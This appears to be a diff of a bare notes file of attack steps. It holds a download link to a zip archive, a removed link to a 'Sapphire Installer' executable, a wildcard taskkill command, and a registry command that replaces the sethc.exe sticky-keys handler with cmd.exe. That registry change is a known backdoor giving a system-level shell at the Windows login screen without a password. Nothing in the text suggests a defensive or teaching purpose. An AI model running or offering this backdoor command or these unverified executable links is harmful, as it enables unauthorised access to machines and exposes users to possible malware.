@@ -1,12 +1,6 @@
 https://files.themoskau.xyz/f/x7Buj/Madium.zip
 
-sapphire: https://www.mediafire.com/file/o0kbso0lssnh04l/Sapphire+Installer+1.0.1.1.exe/file 
-
-
-
 
 
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
-
-
 taskkill /IM *process* /F
